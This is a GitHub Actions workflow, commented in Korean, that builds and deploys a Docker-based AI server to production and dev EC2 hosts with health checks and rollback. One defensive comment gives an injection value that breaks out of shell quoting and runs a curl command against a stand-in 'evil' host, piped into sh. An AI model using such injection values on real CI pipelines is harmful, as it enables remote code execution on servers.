name: Jarvis AI Server CI/CD

on:
  push:
    branches: [main, dev]
  workflow_dispatch:   # Actions 탭에서 수동 실행 가능

env:
  IMAGE: ghcr.io/${{ github.repository }}   # ghcr.io/toss-delta-final/jarvis-ai

jobs:
  # 1단계: 이미지 빌드 — EC2 대신 러너에서 빌드 (테스트/린트는 ci.yml이 담당)
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write   # GHCR 푸시에 필요
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}   # 자동 발급 토큰, 별도 등록 불필요
      # latest + 커밋 해시 태그 (해시 태그는 롤백 시 사용)
      - name: 이미지 빌드 및 푸시
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: |
            ${{ env.IMAGE }}:latest
            ${{ env.IMAGE }}:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max   # 레이어 캐시로 빌드 가속

  # 2단계: 자동 배포 (CD) — main 브랜치 전용
  #   AI 서버는 1대뿐이라 대체할 인스턴스가 없음 — 실패 시 자동 복구가 필수
  deploy:
    if: github.ref == 'refs/heads/main'
    needs: build
    runs-on: ubuntu-latest
    permissions:
      packages: read   # EC2에서 GHCR pull 시 필요 (조직 기본 권한에 의존하지 않도록 명시)
    steps:
      - name: AI 서버 배포 및 기동 검증
        uses: appleboy/ssh-action@v1.0.3   # 버전 고정 — @master는 예고 없이 깨짐
        with:
          host: ${{ secrets.EC2_AI_HOST }}
          username: ${{ secrets.EC2_USERNAME }}
          key: ${{ secrets.EC2_SSH_KEY }}
          timeout: 15m
          command_timeout: 15m
          script: |
            set -e   # 명령 하나라도 실패하면 뒤 단계 실행 안 함

            ENV_FILE=/home/ubuntu/jarvis-ai.env
            ENV_PREV=/home/ubuntu/jarvis-ai.env.prev
            LAST_GOOD=/home/ubuntu/jarvis-ai.last-good

            # 1. 롤백 대상 확보 — 교체 전에 현재 실행 중인 이미지를 기억
            PREV_IMAGE=$(docker inspect -f '{{.Config.Image}}' jarvis-ai 2>/dev/null || true)

            # 2. 기존 컨테이너 유지한 채 새 이미지 먼저 받아 대기
            #    여기서 실패하면 아래로 진행하지 않으므로 서비스는 그대로 유지됨
            echo "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u ${{ github.actor }} --password-stdin

            # 2b. pull 전에 공간 확보 — AI 이미지가 1GB 가까워 15GB 볼륨에서
            #     세 개만 쌓여도 pull 이 "no space left on device" 로 실패한다.
            #     실행 중인 이미지는 도커가 거부하므로 안전하다.
            docker images ${{ env.IMAGE }} --format '{{.ID}} {{.CreatedAt}}' \
              | sort -k2 -r | tail -n +3 | awk '{print $1}' \
              | xargs -r docker rmi -f 2>/dev/null || true

            docker pull ${{ env.IMAGE }}:${{ github.sha }}

            # 3. env 파일 백업 후 새 시크릿·변수 기록
            #    pull 성공 후에 수행 — pull 이 실패했을 때 기존 env 를 건드리지 않기 위함
            #    백업 이유: 실패 원인이 잘못된 시크릿 값일 수 있으므로
            #    이미지만 되돌리면 옛 이미지도 깨진 env 를 물려받아 똑같이 죽음
            umask 077
            if [ -f "$ENV_FILE" ]; then
              cp "$ENV_FILE" "$ENV_PREV"
            fi
            cat << 'ENVEOF' > "$ENV_FILE"
            AUTH_MODE=${{ vars.AUTH_MODE }}
            LLM_PROVIDER=${{ vars.LLM_PROVIDER }}
            SCRIPTED_LLM_MODE=${{ vars.SCRIPTED_LLM_MODE }}
            SCRIPTED_LLM_DELAY_S=${{ vars.SCRIPTED_LLM_DELAY_S }}
            CATALOG_DB_URL=${{ secrets.CATALOG_DB_URL }}
            PROFILE_DB_URL=${{ secrets.PROFILE_DB_URL }}
            SPRING_BASE_URL=${{ secrets.SPRING_BASE_URL }}
            JWKS_URL=${{ vars.JWKS_URL }}
            JWT_ISSUER=${{ vars.JWT_ISSUER }}
            JWT_AUDIENCE=${{ vars.JWT_AUDIENCE }}
            JWT_SCOPE=${{ vars.JWT_SCOPE }}
            INTERNAL_API_TOKEN=${{ secrets.INTERNAL_API_TOKEN }}
            OPENAI_API_KEY=${{ secrets.OPENAI_API_KEY }}
            OPENAI_FAST_MODEL_ID=${{ vars.OPENAI_FAST_MODEL_ID }}
            OPENAI_SMART_MODEL_ID=${{ vars.OPENAI_SMART_MODEL_ID }}
            OPENAI_FAST_REASONING_EFFORT=${{ vars.OPENAI_FAST_REASONING_EFFORT }}
            OPENAI_SMART_REASONING_EFFORT=${{ vars.OPENAI_SMART_REASONING_EFFORT }}
            APP_ENVIRONMENT=${{ vars.APP_ENVIRONMENT }}
            # [#258] 코드 기본값은 off(CI/로컬 DB 없는 환경 보호, 2026-08-08 CI hang 회귀).
            # 운영에서 켜려면 두 저장소 변수(Settings → Variables 탭)를 "true" 로 등록한다.
            # 미등록이면 빈 문자열이 들어가지만 기동은 죽지 않는다 —
            # `_empty_color_synonym_gate_settings_use_default`(app/core/config.py, PR #447
            # 리뷰)가 빈 값을 필드 기본값(off)으로 해석해 기능이 꺼진 채 정상 기동한다.
            COLOR_SYNONYM_EXPANSION_ENABLED=${{ vars.COLOR_SYNONYM_EXPANSION_ENABLED }}
            COLOR_SYNONYM_ARRAY_CONTRACT_READY=${{ vars.COLOR_SYNONYM_ARRAY_CONTRACT_READY }}
            # [2026-08-06, 2026-08-10 정정] 클라이언트 IP 판별 — 아래 값은 "실측"이 아니라
            #   추정이었다. AI 가 그때까지 XFF 를 로그로 남긴 적이 없어 홉 수를 관측할
            #   경로가 없었다(#134). ALB 는 Cloudflare IP 대역으로만 열려 있어 XFF 위조
            #   경로는 차단되지만, 홉 수 자체가 맞는지는 별개 문제다.
            #   확정 방법: 배포 후 client_ip_probe 로그의 cfMatchIndexFromRight 값을
            #   FORWARDED_FOR_TRUSTED_HOPS 에 넣는다. hopMismatch=true 로 찍히면 현재
            #   설정값이 틀린 것이다.
            #   저장소/조직 변수가 미등록이면 빈 문자열이 오지만, 이제는 필드 기본값
            #   (신뢰 off / hops=1)으로 폴백해 기동이 죽지 않는다(#134, 이전에는
            #   ValidationError: bool_parsing 으로 크래시 루프였다) — 대신 신뢰가 꺼지면
            #   IP 백스톱 키가 프록시(ALB) IP 하나로 뭉쳐 전체 사용자가 상한을 공유하므로
            #   값은 계속 등록돼 있어야 한다.
            TRUST_FORWARDED_FOR=${{ vars.TRUST_FORWARDED_FOR }}
            FORWARDED_FOR_TRUSTED_HOPS=${{ vars.FORWARDED_FOR_TRUSTED_HOPS }}
            LANGSMITH_TRACING=${{ vars.LANGSMITH_TRACING }}
            LANGSMITH_API_KEY=${{ secrets.LANGSMITH_API_KEY }}
            LANGSMITH_PROJECT=${{ vars.LANGSMITH_PROJECT }}
            LANGSMITH_TRACING_SAMPLING_RATE=${{ vars.LANGSMITH_TRACING_SAMPLING_RATE }}
            LANGSMITH_EXPORT_TIMEOUT_S=${{ vars.LANGSMITH_EXPORT_TIMEOUT_S }}
            # [#326] 콘텐츠 추적 모드 — 미설정(빈 값)은 앱이 off 로 해석한다(빈 문자열 내성 validator).
            LANGSMITH_TRACE_CONTENT=${{ vars.LANGSMITH_TRACE_CONTENT }}
            GOOGLE_API_KEY=${{ secrets.GOOGLE_API_KEY }}
            PII_HASH_PEPPER=${{ secrets.PII_HASH_PEPPER }}
            EMBEDDING_MODEL_ID=${{ vars.EMBEDDING_MODEL_ID }}
            EMBEDDING_DIM=${{ vars.EMBEDDING_DIM }}
            CORS_ORIGINS=${{ vars.CORS_ORIGINS }}
            MODEL_PRICE_IN_PER_1K=${{ vars.MODEL_PRICE_IN_PER_1K }}
            MODEL_PRICE_CACHED_IN_PER_1K=${{ vars.MODEL_PRICE_CACHED_IN_PER_1K }}
            MODEL_PRICE_CACHE_WRITE_PER_1K=${{ vars.MODEL_PRICE_CACHE_WRITE_PER_1K }}
            MODEL_PRICE_OUT_PER_1K=${{ vars.MODEL_PRICE_OUT_PER_1K }}
            SPRING_MAX_RETRIES=${{ vars.SPRING_MAX_RETRIES }}
            RESCUE_BUDGET_MODE=${{ vars.RESCUE_BUDGET_MODE }}
            RATE_LIMIT_PER_MIN=${{ vars.RATE_LIMIT_PER_MIN }}
            RATE_LIMIT_PER_HOUR=${{ vars.RATE_LIMIT_PER_HOUR }}
            ENVEOF

            # 3b. [#437/#532, PR #539 리뷰] 아래 조건부 키의 (A) 규약(미등록 Variable = 줄 없음 =
            #     코드 기본값)은 heredoc **안**에서 값을 쓰고 빈 줄만 사후에 지우는 방식으로만
            #     구현한다 — **Actions 표현식(달러+이중중괄호, 예: vars.X)을 실행되는 셸 문장
            #     (예: `V='<그 표현식>'`)에 직접 스플라이스하면 안 된다.**
            #     ⚠️ 이 `script:` 는 YAML 블록 스칼라라 `#` 가 주석이 아니라 **리터럴 텍스트**이고,
            #     Actions 는 이 안의 표현식도 그대로 평가한다 — 그래서 설명문에도 표현식 리터럴을
            #     쓰지 않는다(이슈 #553: 내용이 빈 표현식 하나가 워크플로 startup failure 를 내
            #     운영 배포를 전면 중단시켰다). 표현식은 셸이 보기 전에 GitHub Actions 가 텍스트로
            #     치환하므로, 그 결과가 실행 문장 안에 들어가면 값에 작은따옴표 하나만 있어도
            #     리터럴이 거기서 끝나고 이어지는 텍스트가 운영 EC2 에서 그대로 실행된다(예:
            #     값이 `'; curl http://evil/x | sh #` 면 원격 코드 실행 — 최초 구현이 이 함정에
            #     빠져 리뷰로 지적됐다). 위 quoted heredoc(`cat << 'ENVEOF'`) 본문은 셸이 전혀
            #     재해석하지 않는 **데이터**라 이 경로가 구조적으로 없다 — 그래서 조건부 키도 기존
            #     19+줄과 똑같이 heredoc 안에 쓰고, 빈/공백뿐인 값만 아래에서 줄째 삭제해 (A)
            #     규약을 지킨다. sed 대상은 명시한 키로 **한정**한다(기존 줄은 손대지 않는다).
            #     `set -e` 아래라 sed 실패는 배포를 그대로 중단시킨다(의도된 동작). `sed -i` 는
            #     같은 디렉터리에 임시 파일을 만들고 원본으로 rename 하는데, GNU sed 는 그
            #     임시 파일에 원본 $ENV_FILE 의 권한을 그대로 복사한다(umask 와 무관 — 로컬
            #     실측 확인: umask 077 로 만든 0600 파일을 이후 umask 022 로 sed -i 해도 0600
            #     유지). 위 `umask 077` 은 최초 heredoc 생성 시점에 $ENV_FILE 자체를 0600 으로
            #     만드는 역할이고, sed 는 그 권한을 깨지 않고 물려받을 뿐이다.
            sed -i -E '/^(MODEL_PRICE_IN_PER_1K|MODEL_PRICE_CACHED_IN_PER_1K|MODEL_PRICE_CACHE_WRITE_PER_1K|MODEL_PRICE_OUT_PER_1K|SPRING_MAX_RETRIES|RESCUE_BUDGET_MODE|SCRIPTED_LLM_MODE|SCRIPTED_LLM_DELAY_S|RATE_LIMIT_PER_MIN|RATE_LIMIT_PER_HOUR)=[[:space:]]*$/d' "$ENV_FILE"

            # 4. 교체 — 8000 포트를 새 컨테이너가 이어받아야 하므로 중지 후 기동
            #    docker run 뒤의 || true 는 필수: 기동 명령 자체가 실패해도
            #    스크립트를 중단시키지 않고 아래 롤백 경로로 흘려보내기 위함
            docker stop jarvis-ai || true
            docker rm -f jarvis-ai || true
            docker run -d \
              --name jarvis-ai \
              --restart always \
              -p 8000:8000 \
              --log-opt max-size=10m \
              --log-opt max-file=3 \
              --env-file "$ENV_FILE" \
              ${{ env.IMAGE }}:${{ github.sha }} || true

            # 5. 기동 확인 — 2초 간격 최대 45회(약 90초)
            #    모델 로딩·DB 초기화가 느려질 수 있어 기존 60초에서 상향
            OK=0
            for i in $(seq 1 45); do
              if curl -fs http://localhost:8000/health > /dev/null; then OK=1; break; fi
              sleep 2
            done

            # 6. 실패 시 롤백 — AI 서버는 대체 인스턴스가 없으므로 반드시 되살려야 함
            if [ "$OK" != "1" ]; then
              docker logs --tail 100 jarvis-ai || true
              docker rm -f jarvis-ai || true

              ROLLBACK_IMAGE="$PREV_IMAGE"
              if [ -z "$ROLLBACK_IMAGE" ] && [ -f "$LAST_GOOD" ]; then
                ROLLBACK_IMAGE=$(cat "$LAST_GOOD")
              fi

              # 되돌릴 대상이 아예 없는 경우 — 수동 개입 필요
              if [ -z "$ROLLBACK_IMAGE" ]; then
                docker images ${{ env.IMAGE }} --format '{{.Tag}} {{.CreatedSince}}' | head -10
                exit 1
              fi

              # env 파일도 함께 원복
              if [ -f "$ENV_PREV" ]; then
                cp "$ENV_PREV" "$ENV_FILE"
              fi

              docker run -d \
                --name jarvis-ai \
                --restart always \
                -p 8000:8000 \
                --log-opt max-size=10m \
                --log-opt max-file=3 \
                --env-file "$ENV_FILE" \
                "$ROLLBACK_IMAGE" || true

              # 롤백이 실제로 살아났는지 검증 — 최대 60초
              RB=0
              for i in $(seq 1 30); do
                if curl -fs http://localhost:8000/health > /dev/null; then RB=1; break; fi
                sleep 2
              done

              # 롤백까지 실패한 경우에만 두 번째 로그 블록이 찍힘 — 즉시 수동 개입 신호
              if [ "$RB" != "1" ]; then
                docker ps -a --filter 'name=jarvis-ai' --format '{{.Names}} {{.Status}}'
                docker logs --tail 50 jarvis-ai || true
              fi
              exit 1
            fi

            # 7. 정상 기동 확인됨 — 이 이미지를 '마지막 정상'으로 기록
            docker inspect -f '{{.Config.Image}}' jarvis-ai > "$LAST_GOOD"

            # 8. 최신 2개만 남기고 정리 — 지금 도는 것 + 롤백 대상 하나
            #    until 필터는 하루 여러 번 배포하면 조건 밖이 없어져 무력화된다.
            #    AI 이미지가 1GB 가까워 15GB 볼륨에서 세 개만 쌓여도 pull 이 실패한다.
            docker images ${{ env.IMAGE }} --format '{{.ID}} {{.CreatedAt}}' \
              | sort -k2 -r | tail -n +3 | awk '{print $1}' \
              | xargs -r docker rmi -f 2>/dev/null || true
            docker image prune -f

  # 3단계: dev 서버 배포 — dev 브랜치 전용
  #   DB는 catalog_dev·profile_dev로 분리, 백엔드 호출은 dev 도메인으로 향한다.
  deploy-dev:
    if: github.ref == 'refs/heads/dev'
    needs: build
    runs-on: ubuntu-latest
    permissions:
      packages: read
    steps:
      - name: dev AI 서버 배포 및 기동 검증
        uses: appleboy/ssh-action@v1.0.3
        with:
          host: ${{ secrets.EC2_AI_HOST_DEV }}
          username: ${{ secrets.EC2_USERNAME }}
          key: ${{ secrets.EC2_SSH_KEY }}
          timeout: 15m
          command_timeout: 15m
          script: |
            set -e

            ENV_FILE=/home/ubuntu/jarvis-ai.env
            ENV_PREV=/home/ubuntu/jarvis-ai.env.prev
            LAST_GOOD=/home/ubuntu/jarvis-ai.last-good

            PREV_IMAGE=$(docker inspect -f '{{.Config.Image}}' jarvis-ai 2>/dev/null || true)

            echo "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u ${{ github.actor }} --password-stdin

            # pull 전에 공간 확보 (운영과 같은 규칙)
            docker images ${{ env.IMAGE }} --format '{{.ID}} {{.CreatedAt}}' \
              | sort -k2 -r | tail -n +3 | awk '{print $1}' \
              | xargs -r docker rmi -f 2>/dev/null || true

            docker pull ${{ env.IMAGE }}:${{ github.sha }}

            umask 077
            if [ -f "$ENV_FILE" ]; then
              cp "$ENV_FILE" "$ENV_PREV"
            fi
            cat << 'ENVEOF' > "$ENV_FILE"
            AUTH_MODE=${{ vars.AUTH_MODE }}
            LLM_PROVIDER=${{ vars.LLM_PROVIDER }}
            CATALOG_DB_URL=${{ secrets.CATALOG_DB_URL_DEV }}
            PROFILE_DB_URL=${{ secrets.PROFILE_DB_URL_DEV }}
            SPRING_BASE_URL=https://dev.narvis.shop
            JWKS_URL=https://dev.narvis.shop/.well-known/jwks.json
            JWT_ISSUER=${{ vars.JWT_ISSUER }}
            JWT_AUDIENCE=${{ vars.JWT_AUDIENCE }}
            JWT_SCOPE=${{ vars.JWT_SCOPE }}
            INTERNAL_API_TOKEN=${{ secrets.INTERNAL_API_TOKEN }}
            OPENAI_API_KEY=${{ secrets.OPENAI_API_KEY }}
            OPENAI_FAST_MODEL_ID=${{ vars.OPENAI_FAST_MODEL_ID }}
            OPENAI_SMART_MODEL_ID=${{ vars.OPENAI_SMART_MODEL_ID }}
            OPENAI_FAST_REASONING_EFFORT=${{ vars.OPENAI_FAST_REASONING_EFFORT }}
            OPENAI_SMART_REASONING_EFFORT=${{ vars.OPENAI_SMART_REASONING_EFFORT }}
            APP_ENVIRONMENT=${{ vars.APP_ENVIRONMENT }}
            COLOR_SYNONYM_EXPANSION_ENABLED=${{ vars.COLOR_SYNONYM_EXPANSION_ENABLED }}
            COLOR_SYNONYM_ARRAY_CONTRACT_READY=${{ vars.COLOR_SYNONYM_ARRAY_CONTRACT_READY }}
            TRUST_FORWARDED_FOR=${{ vars.TRUST_FORWARDED_FOR }}
            FORWARDED_FOR_TRUSTED_HOPS=${{ vars.FORWARDED_FOR_TRUSTED_HOPS }}
            LANGSMITH_TRACING=${{ vars.LANGSMITH_TRACING }}
            LANGSMITH_API_KEY=${{ secrets.LANGSMITH_API_KEY }}
            LANGSMITH_PROJECT=${{ vars.LANGSMITH_PROJECT }}
            LANGSMITH_TRACING_SAMPLING_RATE=${{ vars.LANGSMITH_TRACING_SAMPLING_RATE }}
            LANGSMITH_EXPORT_TIMEOUT_S=${{ vars.LANGSMITH_EXPORT_TIMEOUT_S }}
            LANGSMITH_TRACE_CONTENT=${{ vars.LANGSMITH_TRACE_CONTENT }}
            GOOGLE_API_KEY=${{ secrets.GOOGLE_API_KEY }}
            PII_HASH_PEPPER=${{ secrets.PII_HASH_PEPPER }}
            EMBEDDING_MODEL_ID=${{ vars.EMBEDDING_MODEL_ID }}
            EMBEDDING_DIM=${{ vars.EMBEDDING_DIM }}
            CORS_ORIGINS=["http://localhost:3000", "https://dev.narvis.shop"]
            MODEL_PRICE_IN_PER_1K=${{ vars.MODEL_PRICE_IN_PER_1K }}
            MODEL_PRICE_CACHED_IN_PER_1K=${{ vars.MODEL_PRICE_CACHED_IN_PER_1K }}
            MODEL_PRICE_CACHE_WRITE_PER_1K=${{ vars.MODEL_PRICE_CACHE_WRITE_PER_1K }}
            MODEL_PRICE_OUT_PER_1K=${{ vars.MODEL_PRICE_OUT_PER_1K }}
            SPRING_MAX_RETRIES=${{ vars.SPRING_MAX_RETRIES }}
            RESCUE_BUDGET_MODE=${{ vars.RESCUE_BUDGET_MODE }}
            ENVEOF

            sed -i -E '/^(MODEL_PRICE_IN_PER_1K|MODEL_PRICE_CACHED_IN_PER_1K|MODEL_PRICE_CACHE_WRITE_PER_1K|MODEL_PRICE_OUT_PER_1K|SPRING_MAX_RETRIES|RESCUE_BUDGET_MODE)=[[:space:]]*$/d' "$ENV_FILE"

            docker stop jarvis-ai || true
            docker rm -f jarvis-ai || true
            docker run -d \
              --name jarvis-ai \
              --restart always \
              -p 8000:8000 \
              --log-opt max-size=10m \
              --log-opt max-file=3 \
              --env-file "$ENV_FILE" \
              ${{ env.IMAGE }}:${{ github.sha }} || true

            OK=0
            for i in $(seq 1 45); do
              if curl -fs http://localhost:8000/health > /dev/null; then OK=1; break; fi
              sleep 2
            done

            if [ "$OK" != "1" ]; then
              docker logs --tail 100 jarvis-ai || true
              docker rm -f jarvis-ai || true

              ROLLBACK_IMAGE="$PREV_IMAGE"
              if [ -z "$ROLLBACK_IMAGE" ] && [ -f "$LAST_GOOD" ]; then
                ROLLBACK_IMAGE=$(cat "$LAST_GOOD")
              fi
              if [ -z "$ROLLBACK_IMAGE" ]; then
                docker images ${{ env.IMAGE }} --format '{{.Tag}} {{.CreatedSince}}' | head -10
                exit 1
              fi

              if [ -f "$ENV_PREV" ]; then
                cp "$ENV_PREV" "$ENV_FILE"
              fi

              docker run -d \
                --name jarvis-ai \
                --restart always \
                -p 8000:8000 \
                --log-opt max-size=10m \
                --log-opt max-file=3 \
                --env-file "$ENV_FILE" \
                "$ROLLBACK_IMAGE" || true
              exit 1
            fi

            docker inspect -f '{{.Config.Image}}' jarvis-ai > "$LAST_GOOD"

            # 최신 2개만 남기고 정리 (운영과 같은 규칙)
            docker images ${{ env.IMAGE }} --format '{{.ID}} {{.CreatedAt}}' \
              | sort -k2 -r | tail -n +3 | awk '{print $1}' \
              | xargs -r docker rmi -f 2>/dev/null || true
            docker image prune -f
